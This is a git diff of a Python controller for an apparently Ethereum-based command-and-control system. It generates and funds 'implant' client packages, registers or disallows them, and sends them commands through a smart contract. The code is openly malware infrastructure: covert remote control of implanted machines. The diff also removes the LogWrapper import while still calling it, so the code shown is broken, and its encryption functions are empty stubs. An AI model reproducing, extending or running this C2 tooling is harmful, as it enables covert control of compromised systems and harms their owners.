@@ -1,15 +1,17 @@
-import yaml, os, sys, glob, atexit,json
+import yaml, os, sys, glob, json,argparse
 from os.path import join as opj
 from web3 import Web3, HTTPProvider
 from web3.contract import ConciseContract
 from Util.WalletOperations import unlockAccount, generatePassword, generateWallet, loadWallet, getAccountBalance
-from Util.LogWrapper import LogWrapper
 from shutil import copyfile,copy
 from Util.EtherLogEvents import *
 from Util.SolidityTypeConversions import *
-
+from Util.TransactionLogger import TransactionLogger
 
 import shelve
+
+SERVER_CONF_FILE = opj('conf','server', 'ServerConf.yaml')
+TRANSACTION_LOG_LOC = opj('logs', 'transaction.log')
 
 REGISTRATION_REQUEST_EVENT_NAME = 'RegistrationRequest'
 COMMAND_RESULT_EVENT_NAME = 'CommandResult'
@@ -17,7 +19,7 @@ COMMAND_RESULT_EVENT_NAME = 'CommandResult'
 
 class ServerCommands:
 
-	def __init__(self, confFile):
+	def __init__(self, confFile, transactionLogFilename = TRANSACTION_LOG_LOC):
 
 		with open(confFile) as f:
 			conf = yaml.safe_load(f)
@@ -30,7 +32,6 @@ class ServerCommands:
 
 		# load CnC contract
 		self.contract = self.loadContract()
-		#TODO: check contract is up, otherwise go to sleep or die
 
 		self.ownerAddress = conf['ownerAddress']
 		self.ownerPassword = conf['ownerWalletPassword']
@@ -47,32 +48,14 @@ class ServerCommands:
 		if not 'cmdId' in self.instances:
 			self.instances['cmdId'] = 0
 
-		self.log_tx = LogWrapper.getLogger(name='transaction', filename=opj('logs', 'transaction.log'))
+		self.transactionCostLogger = TransactionLogger(transactionLogFilename, self.web3)
 
-		#
-		#
-		# self.cmdId = shelve.open(self.instancesDbFile + '.cmdId')
-		# if os.path.exists(self.instancesDbFile):
-		# 	with open (self.instancesDbFile) as f:
-		# 		db = yaml.safe_load(f)
-		# 		self.instances = db['instances']
-		# 		self.cmdId = db['cmdId']
-		# 	l.debug('loaded instancesDb file to', self.instancesDbFile)
-		# else:
-		# 	l.debug('no instance db. creating a new one')
-		# 	self.instances = {}
-		# 	self.cmdId = 0
-		#
-		# atexit.register(
-		# 	lambda : self.writeInstancesDB())
-
-	# def writeInstancesDB(self):
-	# 	with open(self.instancesDbFile, 'w') as f:
-	# 		yaml.safe_dump({'instances':self.instances,'cmdId':self.cmdId}, f)
-	# 	l.debug('save instancesDb file to',self.instancesDbFile)
-
+	
 	def loadContract(self):
-
+		'''
+		loads the contract by address and abi
+		:return:
+		'''
 		l.info('loading contract from:', self.contractAddress)
 		l.debug('contract abi:', self.contractAbi)
 
@@ -80,13 +63,13 @@ class ServerCommands:
 		return contract
 
 	'''
-		
-		:param clientConfTemplateFile: 
-		:param clientId: 
-		:param rpcPort: 
-		:param walletJson: 
-		:param walletPassword: 
-		:return: 
+		Generates a new implant client package
+		:param clientConfTemplateFile: template config file for clients
+		:param clientId: unique id for client. optional
+		:param rpcPort: local RPC port for client geth
+		:param walletJson: use an existing wallet. Will genetate if None
+		:param walletPassword: wallet passerd. one will be auto generated if None
+		:return: clientAddress, clientConfTemplate
 	'''
 	def generateNewClientInstance (self, clientConfTemplateFile, fundValue, clientId = '', rpcPort = 8545, port=30303, walletJson = None, walletPassword = None):
 		
@@ -126,10 +109,7 @@ class ServerCommands:
 		if opMode == 'mainNet':
 			clientConfTemplate['privateNet'] = None
 		
-		
-
 		# Package the Code
-		#TODO add all components
 		generatedDir = opj('generated',address)
 		l.info('writing client payload into',generatedDir)
 		os.makedirs(opj(generatedDir, 'src', 'Client'), exist_ok=True)
@@ -151,52 +131,58 @@ class ServerCommands:
 		os.makedirs(opj(generatedDir, 'build'), exist_ok=True)
 		os.makedirs(opj(generatedDir, 'logs'), exist_ok=True)
 
-		
 		self.instances[address] = {}
 		self.instances[address]['public'] = public
 		self.instances[address]['commands'] = {}
 		self.instances.sync()
 
-		# txhash = self.web3.eth.sendTransaction({'from': self.ownerAddress, 'to': address,
-		# 							 'value': fundValue, 'gas': 21000})
-		#
-		# logTransactionCost(self.web3, txhash, 'fundTransfer')
-		# l.info ("Sending ",self.web3.fromWei(fundValue,"ether"),"ether to client wallet",)
 		self.fundTransfer(address,fundValue)
 		self.allowInstance(address)
 
 		#TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.
 
-
-
-
 		return address, clientConfTemplate
 
 	def decryptMessage(self, msg, decrypt=True):
+		'''
+		Decrypt a message using wallet private key
+		:param msg:
+		:param decrypt:
+		:return:
+		'''
 		if decrypt:
 			pass
-			#TODO compelete
-		# 	alice = pyelliptic.ecc()
-		# 	msg = alice.encrypt(msg,self.ownerPubKey)
+			#TODO complete. Need to find a proper elliptic curve crypto library in python
 		return msg
 
 	def encryptMessage(self, instanceAddress, msg, encrypt=True):
+		'''
+		Encrypt a message for an address using its public key
+		:param instanceAddress:
+		:param msg:
+		:param encrypt:
+		:return:
+		'''
 		public = self.instances[instanceAddress]['public']
 		if encrypt:
-			# TODO compelete
+			# TODO complete. Need to find a proper elliptic curve crypto library in python
 			pass
-		# 	bob = pyelliptic.ecc()
-		# 	bob.decrypt()
 		return msg
 
 	def addWork (self, instanceAddress, command):
+		'''
+		Issue a command for an implant address
+		:param instanceAddress:
+		:param command:
+		:return:
+		'''
 		if instanceAddress in self.instances:
 			commandEnc = self.encryptMessage(instanceAddress,command)
 			instanceHash = sha3AsBytes(instanceAddress)
 			txhash = self.contract.addWork(instanceHash, commandEnc, self.instances['cmdId'], transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
 			l.info("Command",self.instances['cmdId']," was sent to",instanceAddress, 'txHash:', txhash)
-			transactionCostLogger.insert(self.web3, txhash, 'addWork',len(command), self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'addWork',len(command))
 			
 			self.instances[instanceAddress]['commands'][self.instances['cmdId']] = [command, None]
 			self.instances['cmdId'] += 1
@@ -204,16 +190,18 @@ class ServerCommands:
 			return True
 		return False
 
-	def toBytes32Hash(self,x):
-		return hexStringToBytes(self.web3.sha3(x))
-
 	def removeInstance (self, instanceAddress):
+		'''
+		Disallow an instance address from the network
+		:param instanceAddress:
+		:return:
+		'''
 		if instanceAddress in self.instances:
 			instanceHash = sha3AsBytes(instanceAddress)
 			txhash = self.contract.removeInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
 			l.info("disallowing ",instanceAddress, 'txHash:', txhash)
-			transactionCostLogger.insert(self.web3, txhash, 'removeInstance', len(instanceAddress), self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'removeInstance', len(instanceAddress))
 			
 			l.info("sending back all remaining funds of", instanceAddress, 'to owner:', self.ownerAddress)
 			self.unFundTransfer(instanceAddress)
@@ -222,26 +210,35 @@ class ServerCommands:
 		return False
 
 	def allowInstance (self, instanceAddress):
+		'''
+		Allows an implant address to register. If already registered it will reset the address and require the implant to re-register
+		:param instanceAddress:
+		:return:
+		'''
 		if instanceAddress in self.instances:
 			instanceHash = sha3AsBytes(instanceAddress)
 			txhash = self.contract.allowInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
 			l.info("registration allowed for:",instanceAddress,'hash:',encode_hex(instanceHash),'txHash:',txhash)
-			transactionCostLogger.insert(self.web3, txhash, 'allowInstance',len(instanceAddress), self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'allowInstance',len(instanceAddress))
 			
 			return True
 		return False
-	
-		
-		
+
 	def registrationConfirmation (self, instanceAddress, sessionId):
+		'''
+		Sends a registration confirmation to a successful registration.
+		:param instanceAddress:
+		:param sessionId:
+		:return:
+		'''
 		if instanceAddress in self.instances:
 			instanceHash = sha3AsBytes(instanceAddress)
 			sessionId = self.encryptMessage(instanceAddress, sessionId)
 			txhash = self.contract.registrationConfirmation(instanceHash,sessionId, transact={'from': self.ownerAddress, 'gas': self.gasLimit_ev})
 			
 			l.info("sending successful registration confirmation to",instanceAddress,'txHash:',txhash)
-			transactionCostLogger.insert(self.web3, txhash, 'registrationConfirmation', len(sessionId), self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'registrationConfirmation', len(sessionId))
 			
 			return True
 		else:
@@ -249,22 +246,35 @@ class ServerCommands:
 			return False
 
 	def fundTransfer(self, instanceAddress, fundValue):
+		'''
+		Send Ether to an implant
+		:param instanceAddress:
+		:param fundValue:
+		:return:
+		'''
 		if instanceAddress in self.instances:
 			txhash = self.web3.eth.sendTransaction({'from': self.ownerAddress, 'to': instanceAddress,
 			                                        'value': fundValue, 'gas': 21000})
 			l.info("Sending ", self.web3.fromWei(fundValue, "ether"), "ether to client wallet", )
-			transactionCostLogger.insert(self.web3, txhash, 'fundTransfer',32, self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'fundTransfer',32)
 		else:
 			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
 			return False
 		
 	def unFundTransfer(self, instanceAddress):
+		'''
+		Removes all Ether from a compromised implant address. Use in case of implant compromise.
+		DOES NOT WORK!!! Needs to open the implant account first.
+		:param instanceAddress:
+		:return:
+		'''
 		if instanceAddress in self.instances:
+			#TODO Require open and load the implant account before running this.
 			balance = getAccountBalance(self.web3,instanceAddress,'wei')
 			txhash = self.web3.eth.sendTransaction({'from': instanceAddress, 'to': self.ownerAddress,
 			                                        'value': int(balance), 'gas': 21000})
 			l.info("Sending ", self.web3.fromWei(balance, "ether"), "ether to client wallet", )
-			transactionCostLogger.insert(self.web3, txhash, 'fundTransfer',32, self.log_tx)
+			self.transactionCostLogger.insert(txhash, 'fundTransfer',32)
 		else:
 			l.error("Got a request to transfer funds to an instance that is not on the instance list!!! refusing of course... :",instanceAddress)
 			return False
@@ -369,12 +379,21 @@ class ServerCommands:
 				print('result:', result['output'])
 
 if __name__ == "__main__":
+	parser = argparse.ArgumentParser(
+		prog='Command line controller application',
+		description='This is a command line utility for interacting with a deployed UC smart contract. It can be used to generating, issue command and managing implants'
+		            ' Run with python -i to get shell. use object sc to call for different commands.'
+					'Once loaded, watchers will be started on auto reply for any event sent to controller from implants',
+		epilog='Available commands: generateNewClientInstance, allowInstance, removeInstance, addWork, fundTransfer'
+	)
+	parser.add_argument("baseDir", help="Location of base directory. all conf, scripts and bin files are assumed to exist in a subdirectory of base dir.")
+	args = parser.parse_args()
 
-	os.chdir(sys.argv[1])
-	l = LogWrapper.getLogger()
-	l.info("base dir ", sys.argv[1])
-
-	sc = ServerCommands(opj('conf','server', 'ServerConf.yaml'))
+	os.chdir(args.baseDir)
+	l = LogWrapper.getDefaultLogger()
+	l.info("Base dir: ", args.baseDir)
+	
+	sc = ServerCommands(SERVER_CONF_FILE)
 
 	# clientAddress, clientConfTemplate = sc.generateNewClientInstance(opj('conf','clientGen', 'ClientConf.TEMPLATE.yaml'),fundValue=1000000000000000000, port=30304)
 
